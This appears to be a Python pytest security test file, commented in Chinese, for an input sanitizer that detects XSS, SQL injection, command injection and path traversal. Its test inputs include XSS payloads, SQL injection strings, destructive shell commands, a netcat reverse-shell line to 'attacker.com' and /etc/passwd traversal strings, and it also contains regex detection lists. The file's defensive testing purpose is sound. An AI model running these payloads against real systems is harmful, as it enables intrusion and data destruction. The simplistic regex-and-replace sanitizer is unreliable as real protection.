# AgentOS 输入净化安全测试
# Version: 1.0.0.6
# Last updated: 2026-03-23

"""
AgentOS 输入净化安全测试模块。

测试输入净化器的各种安全防护能力，包括 XSS 防护、SQL 注入防护、
命令注入防护、路径遍历防护等。
"""

import pytest
import re
import html
from typing import Dict, Any, List, Optional, Callable
from unittest.mock import Mock, MagicMock, patch
from dataclasses import dataclass
from enum import Enum

import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'tools', 'python')))


# ============================================================
# 测试标记
# ============================================================

pytestmark = pytest.mark.security


# ============================================================
# 枚举和数据类定义
# ============================================================

class SanitizationLevel(Enum):
    """净化级别枚举"""
    STRICT = "strict"
    MODERATE = "moderate"
    PERMISSIVE = "permissive"


class ThreatType(Enum):
    """威胁类型枚举"""
    XSS = "xss"
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XML_INJECTION = "xml_injection"


@dataclass
class SanitizationResult:
    """净化结果"""
    original: str
    sanitized: str
    threats_detected: List[str]
    was_modified: bool


# ============================================================
# 输入净化器实现
# ============================================================

class InputSanitizer:
    """
    输入净化器。
    
    提供多种输入净化功能，防止常见的安全攻击。
    """
    
    XSS_PATTERNS = [
        r'<script[^>]*>.*?</script>',
        r'<script[^>]*/>',
        r'javascript\s*:',
        r'on\w+\s*=',
        r'<iframe[^>]*>',
        r'<object[^>]*>',
        r'<embed[^>]*>',
        r'<form[^>]*>',
        r'<input[^>]*>',
        r'<img[^>]+onerror',
        r'<svg[^>]+onload',
        r'<body[^>]+onload',
    ]
    
    SQL_INJECTION_PATTERNS = [
        r"('|\")\s*(OR|AND)\s*('|\")?\s*=(\s*('|\")?\s*('|\")|[\d]+)",
        r"(UNION\s+ALL|UNION)\s+SELECT",
        r"(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE)\s+",
        r"--\s*$",
        r"/\*.*\*/",
        r"(EXEC|EXECUTE)\s+",
        r"(xp_|sp_)\w+",
        r"WAITFOR\s+DELAY",
        r"BENCHMARK\s*\(",
        r"SLEEP\s*\(",
    ]
    
    COMMAND_INJECTION_PATTERNS = [
        r";\s*(rm|del|format|shutdown|reboot|halt|poweroff)",
        r"\|\s*(cat|type|more|less|head|tail)",
        r"\$\([^)]+\)",
        r"`[^`]+`",
        r"&&\s*\w+",
        r"\|\|\s*\w+",
        r">\s*/",
        r"<\s*/",
    ]
    
    PATH_TRAVERSAL_PATTERNS = [
        r"\.\./+",
        r"\.\.\\+",
        r"%2e%2e[/\\]",
        r"%252e%252e",
        r"\.\.%00",
        r"\.\.%c0%af",
    ]
    
    def __init__(self, level: SanitizationLevel = SanitizationLevel.MODERATE):
        """
        初始化输入净化器。
        
        Args:
            level: 净化级别
        """
        self.level = level
        self._compile_patterns()
    
    def _compile_patterns(self) -> None:
        """编译正则表达式模式"""
        self._xss_patterns = [
            re.compile(p, re.IGNORECASE | re.DOTALL) 
            for p in self.XSS_PATTERNS
        ]
        self._sql_patterns = [
            re.compile(p, re.IGNORECASE) 
            for p in self.SQL_INJECTION_PATTERNS
        ]
        self._cmd_patterns = [
            re.compile(p, re.IGNORECASE) 
            for p in self.COMMAND_INJECTION_PATTERNS
        ]
        self._path_patterns = [
            re.compile(p, re.IGNORECASE) 
            for p in self.PATH_TRAVERSAL_PATTERNS
        ]
    
    def sanitize(self, input_str: str) -> SanitizationResult:
        """
        净化输入字符串。
        
        Args:
            input_str: 输入字符串
            
        Returns:
            SanitizationResult: 净化结果
        """
        if not isinstance(input_str, str):
            raise TypeError("输入必须是字符串")
        
        threats = []
        sanitized = input_str
        
        xss_threats = self._detect_xss(sanitized)
        if xss_threats:
            threats.extend(xss_threats)
            sanitized = self._remove_xss(sanitized)
        
        sql_threats = self._detect_sql_injection(sanitized)
        if sql_threats:
            threats.extend(sql_threats)
            sanitized = self._remove_sql_injection(sanitized)
        
        cmd_threats = self._detect_command_injection(sanitized)
        if cmd_threats:
            threats.extend(cmd_threats)
            sanitized = self._remove_command_injection(sanitized)
        
        path_threats = self._detect_path_traversal(sanitized)
        if path_threats:
            threats.extend(path_threats)
            sanitized = self._remove_path_traversal(sanitized)
        
        return SanitizationResult(
            original=input_str,
            sanitized=sanitized,
            threats_detected=threats,
            was_modified=(sanitized != input_str)
        )
    
    def sanitize_html(self, input_str: str) -> str:
        """
        净化 HTML 输入。
        
        Args:
            input_str: 输入字符串
            
        Returns:
            str: 净化后的字符串
        """
        return html.escape(input_str)
    
    def sanitize_sql(self, input_str: str) -> str:
        """
        净化 SQL 输入。
        
        Args:
            input_str: 输入字符串
            
        Returns:
            str: 净化后的字符串
        """
        if not isinstance(input_str, str):
            return input_str
        
        result = input_str.replace("'", "''")
        result = result.replace("\\", "\\\\")
        result = result.replace("\x00", "\\x00")
        result = result.replace("\n", "\\n")
        result = result.replace("\r", "\\r")
        
        return result
    
    def sanitize_path(self, input_str: str) -> str:
        """
        净化路径输入。
        
        Args:
            input_str: 输入字符串
            
        Returns:
            str: 净化后的字符串
        """
        if not isinstance(input_str, str):
            return input_str
        
        result = input_str.replace("../", "")
        result = result.replace("..\\", "")
        result = result.replace("..", "")
        
        return result
    
    def sanitize_filename(self, input_str: str) -> str:
        """
        净化文件名输入。
        
        Args:
            input_str: 输入字符串
            
        Returns:
            str: 净化后的字符串
        """
        if not isinstance(input_str, str):
            return input_str
        
        dangerous_chars = ['<', '>', ':', '"', '|', '?', '*', '\\', '/']
        result = input_str
        
        for char in dangerous_chars:
            result = result.replace(char, '_')
        
        result = re.sub(r'^\.+', '', result)
        
        return result
    
    def validate_json(self, data: Dict[str, Any], 
                     max_depth: int = 10,
                     max_string_length: int = 10000) -> bool:
        """
        验证 JSON 数据。
        
        Args:
            data: JSON 数据
            max_depth: 最大嵌套深度
            max_string_length: 最大字符串长度
            
        Returns:
            bool: 是否有效
        """
        if not isinstance(data, dict):
            return False
        
        return self._validate_json_recursive(data, 0, max_depth, max_string_length)
    
    def _validate_json_recursive(self, data: Any, depth: int, 
                                  max_depth: int, max_string_length: int) -> bool:
        """递归验证 JSON 数据"""
        if depth > max_depth:
            return False
        
        if isinstance(data, dict):
            for key, value in data.items():
                if not isinstance(key, str):
                    return False
                if not self._validate_json_recursive(value, depth + 1, max_depth, max_string_length):
                    return False
        elif isinstance(data, list):
            for item in data:
                if not self._validate_json_recursive(item, depth + 1, max_depth, max_string_length):
                    return False
        elif isinstance(data, str):
            if len(data) > max_string_length:
                return False
        
        return True
    
    def _detect_xss(self, input_str: str) -> List[str]:
        """检测 XSS 威胁"""
        threats = []
        for pattern in self._xss_patterns:
            if pattern.search(input_str):
                threats.append(ThreatType.XSS.value)
                break
        return threats
    
    def _detect_sql_injection(self, input_str: str) -> List[str]:
        """检测 SQL 注入威胁"""
        threats = []
        for pattern in self._sql_patterns:
            if pattern.search(input_str):
                threats.append(ThreatType.SQL_INJECTION.value)
                break
        return threats
    
    def _detect_command_injection(self, input_str: str) -> List[str]:
        """检测命令注入威胁"""
        threats = []
        for pattern in self._cmd_patterns:
            if pattern.search(input_str):
                threats.append(ThreatType.COMMAND_INJECTION.value)
                break
        return threats
    
    def _detect_path_traversal(self, input_str: str) -> List[str]:
        """检测路径遍历威胁"""
        threats = []
        for pattern in self._path_patterns:
            if pattern.search(input_str):
                threats.append(ThreatType.PATH_TRAVERSAL.value)
                break
        return threats
    
    def _remove_xss(self, input_str: str) -> str:
        """移除 XSS 威胁"""
        result = input_str
        for pattern in self._xss_patterns:
            result = pattern.sub('', result)
        return result
    
    def _remove_sql_injection(self, input_str: str) -> str:
        """移除 SQL 注入威胁"""
        result = input_str
        for pattern in self._sql_patterns:
            result = pattern.sub('', result)
        return result
    
    def _remove_command_injection(self, input_str: str) -> str:
        """移除命令注入威胁"""
        result = input_str
        for pattern in self._cmd_patterns:
            result = pattern.sub('', result)
        return result
    
    def _remove_path_traversal(self, input_str: str) -> str:
        """移除路径遍历威胁"""
        result = input_str
        for pattern in self._path_patterns:
            result = pattern.sub('', result)
        return result


# ============================================================
# 测试用例
# ============================================================

class TestXSSPrevention:
    """XSS 防护测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """
        提供输入净化器实例。
        
        Returns:
            InputSanitizer: 净化器实例
        """
        return InputSanitizer()
    
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "<script src='evil.js'></script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'>",
        "<a href='javascript:alert(1)'>click</a>",
        "<div onclick='alert(1)'>click</div>",
        "<input onfocus='alert(1)' autofocus>",
        "<marquee onstart='alert(1)'>",
    ])
    def test_xss_detection_and_removal(self, sanitizer, malicious_input):
        """
        测试 XSS 检测和移除。
        
        验证:
            - XSS 攻击载荷被正确检测
            - XSS 攻击载荷被正确移除
        """
        result = sanitizer.sanitize(malicious_input)
        
        assert ThreatType.XSS.value in result.threats_detected
        assert "<script>" not in result.sanitized.lower()
        assert "javascript:" not in result.sanitized.lower()
        assert "onerror=" not in result.sanitized.lower()
        assert "onclick=" not in result.sanitized.lower()
    
    def test_html_escape(self, sanitizer):
        """
        测试 HTML 转义。
        
        验证:
            - 特殊 HTML 字符被正确转义
        """
        input_str = "<script>alert('xss')</script>"
        result = sanitizer.sanitize_html(input_str)
        
        assert "<" not in result
        assert ">" not in result
        assert "&lt;" in result
        assert "&gt;" in result
    
    def test_nested_xss_attack(self, sanitizer):
        """
        测试嵌套 XSS 攻击。
        
        验证:
            - 嵌套的 XSS 攻击被正确处理
        """
        malicious = "<<script>script>alert('xss')</script>"
        result = sanitizer.sanitize(malicious)
        
        assert result.was_modified


class TestSQLInjectionPrevention:
    """SQL 注入防护测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """提供净化器实例"""
        return InputSanitizer()
    
    @pytest.mark.parametrize("malicious_input", [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users--",
        "admin'--",
        "1; DELETE FROM users WHERE 1=1",
        "' UNION ALL SELECT NULL,username,password FROM users--",
        "1' AND '1'='1",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' WAITFOR DELAY '0:0:5'--",
        "' OR 1=1--",
    ])
    def test_sql_injection_detection(self, sanitizer, malicious_input):
        """
        测试 SQL 注入检测。
        
        验证:
            - SQL 注入攻击被正确检测
        """
        result = sanitizer.sanitize(malicious_input)
        
        assert ThreatType.SQL_INJECTION.value in result.threats_detected
    
    def test_sql_sanitization(self, sanitizer):
        """
        测试 SQL 净化。
        
        验证:
            - 单引号被正确转义
        """
        input_str = "O'Brien"
        result = sanitizer.sanitize_sql(input_str)
        
        assert result == "O''Brien"
    
    def test_sql_injection_removal(self, sanitizer):
        """
        测试 SQL 注入移除。
        
        验证:
            - SQL 注入攻击载荷被正确移除
        """
        malicious = "1' UNION SELECT * FROM users--"
        result = sanitizer.sanitize(malicious)
        
        assert "UNION" not in result.sanitized.upper() or result.was_modified


class TestCommandInjectionPrevention:
    """命令注入防护测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """提供净化器实例"""
        return InputSanitizer()
    
    @pytest.mark.parametrize("malicious_input", [
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& del /f /q *",
        "|| format c:",
        "> /etc/passwd",
        "; shutdown -h now",
        "| nc -e /bin/sh attacker.com 4444",
        "& net user hacker password /add",
    ])
    def test_command_injection_detection(self, sanitizer, malicious_input):
        """
        测试命令注入检测。
        
        验证:
            - 命令注入攻击被正确检测
        """
        result = sanitizer.sanitize(malicious_input)
        
        assert ThreatType.COMMAND_INJECTION.value in result.threats_detected
    
    def test_command_substitution_removal(self, sanitizer):
        """
        测试命令替换移除。
        
        验证:
            - 命令替换语法被正确移除
        """
        malicious = "file$(whoami).txt"
        result = sanitizer.sanitize(malicious)
        
        assert result.was_modified


class TestPathTraversalPrevention:
    """路径遍历防护测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """提供净化器实例"""
        return InputSanitizer()
    
    @pytest.mark.parametrize("malicious_input", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%00/..%00/..%00/etc/passwd",
        "/etc/passwd%00",
    ])
    def test_path_traversal_detection(self, sanitizer, malicious_input):
        """
        测试路径遍历检测。
        
        验证:
            - 路径遍历攻击被正确检测
        """
        result = sanitizer.sanitize(malicious_input)
        
        assert ThreatType.PATH_TRAVERSAL.value in result.threats_detected
    
    def test_path_sanitization(self, sanitizer):
        """
        测试路径净化。
        
        验证:
            - 路径遍历字符被正确移除
        """
        malicious = "../../../etc/passwd"
        result = sanitizer.sanitize_path(malicious)
        
        assert "../" not in result
        assert "..\\" not in result
    
    def test_filename_sanitization(self, sanitizer):
        """
        测试文件名净化。
        
        验证:
            - 危险文件名字符被正确处理
        """
        malicious = "file<script>.txt"
        result = sanitizer.sanitize_filename(malicious)
        
        assert "<" not in result
        assert ">" not in result


class TestJSONValidation:
    """JSON 验证测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """提供净化器实例"""
        return InputSanitizer()
    
    def test_valid_json_passes(self, sanitizer):
        """
        测试有效 JSON 通过验证。
        
        验证:
            - 有效的 JSON 数据通过验证
        """
        data = {
            "name": "test",
            "value": 123,
            "nested": {"key": "value"}
        }
        
        assert sanitizer.validate_json(data) is True
    
    def test_invalid_json_key_type(self, sanitizer):
        """
        测试无效 JSON 键类型。
        
        验证:
            - 非字符串键被拒绝
        """
        data = {123: "value"}
        
        assert sanitizer.validate_json(data) is False
    
    def test_oversized_json_string(self, sanitizer):
        """
        测试超大 JSON 字符串。
        
        验证:
            - 超过长度限制的字符串被拒绝
        """
        data = {"key": "x" * 20000}
        
        assert sanitizer.validate_json(data, max_string_length=10000) is False
    
    def test_deeply_nested_json(self, sanitizer):
        """
        测试深度嵌套 JSON。
        
        验证:
            - 超过深度限制的嵌套被拒绝
        """
        data = {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": "value"}}}}}}}}}}
        
        assert sanitizer.validate_json(data, max_depth=5) is False


class TestSanitizationLevels:
    """净化级别测试"""
    
    def test_strict_level(self):
        """
        测试严格净化级别。
        
        验证:
            - 严格级别正确设置
        """
        sanitizer = InputSanitizer(level=SanitizationLevel.STRICT)
        
        assert sanitizer.level == SanitizationLevel.STRICT
    
    def test_moderate_level(self):
        """
        测试中等净化级别。
        
        验证:
            - 中等级别正确设置
        """
        sanitizer = InputSanitizer(level=SanitizationLevel.MODERATE)
        
        assert sanitizer.level == SanitizationLevel.MODERATE
    
    def test_permissive_level(self):
        """
        测试宽松净化级别。
        
        验证:
            - 宽松级别正确设置
        """
        sanitizer = InputSanitizer(level=SanitizationLevel.PERMISSIVE)
        
        assert sanitizer.level == SanitizationLevel.PERMISSIVE


class TestEdgeCases:
    """边界情况测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """提供净化器实例"""
        return InputSanitizer()
    
    def test_empty_string(self, sanitizer):
        """
        测试空字符串。
        
        验证:
            - 空字符串被正确处理
        """
        result = sanitizer.sanitize("")
        
        assert result.sanitized == ""
        assert len(result.threats_detected) == 0
    
    def test_none_input_raises_error(self, sanitizer):
        """
        测试 None 输入。
        
        验证:
            - None 输入抛出类型错误
        """
        with pytest.raises(TypeError):
            sanitizer.sanitize(None)
    
    def test_numeric_input_raises_error(self, sanitizer):
        """
        测试数字输入。
        
        验证:
            - 数字输入抛出类型错误
        """
        with pytest.raises(TypeError):
            sanitizer.sanitize(12345)
    
    def test_unicode_input(self, sanitizer):
        """
        测试 Unicode 输入。
        
        验证:
            - Unicode 字符被正确处理
        """
        input_str = "你好世界 <script>alert('xss')</script>"
        result = sanitizer.sanitize(input_str)
        
        assert "你好世界" in result.sanitized
        assert "<script>" not in result.sanitized
    
    def test_multiple_threats(self, sanitizer):
        """
        测试多种威胁。
        
        验证:
            - 同时包含多种威胁的输入被正确处理
        """
        malicious = "<script>alert(1)</script>; DROP TABLE users; | cat /etc/passwd"
        result = sanitizer.sanitize(malicious)
        
        assert len(result.threats_detected) >= 1
        assert result.was_modified


class TestSanitizationResult:
    """净化结果测试"""
    
    @pytest.fixture
    def sanitizer(self) -> InputSanitizer:
        """提供净化器实例"""
        return InputSanitizer()
    
    def test_result_contains_original(self, sanitizer):
        """
        测试结果包含原始输入。
        
        验证:
            - 结果中包含原始输入
        """
        input_str = "test input"
        result = sanitizer.sanitize(input_str)
        
        assert result.original == input_str
    
    def test_result_contains_sanitized(self, sanitizer):
        """
        测试结果包含净化后的输出。
        
        验证:
            - 结果中包含净化后的输出
        """
        input_str = "test input"
        result = sanitizer.sanitize(input_str)
        
        assert hasattr(result, 'sanitized')
    
    def test_was_modified_flag(self, sanitizer):
        """
        测试修改标志。
        
        验证:
            - 修改标志正确反映是否发生了修改
        """
        clean_input = "clean input"
        malicious_input = "<script>alert(1)</script>"
        
        clean_result = sanitizer.sanitize(clean_input)
        malicious_result = sanitizer.sanitize(malicious_input)
        
        assert clean_result.was_modified is False
        assert malicious_result.was_modified is True


# ============================================================
# 运行测试
# ============================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
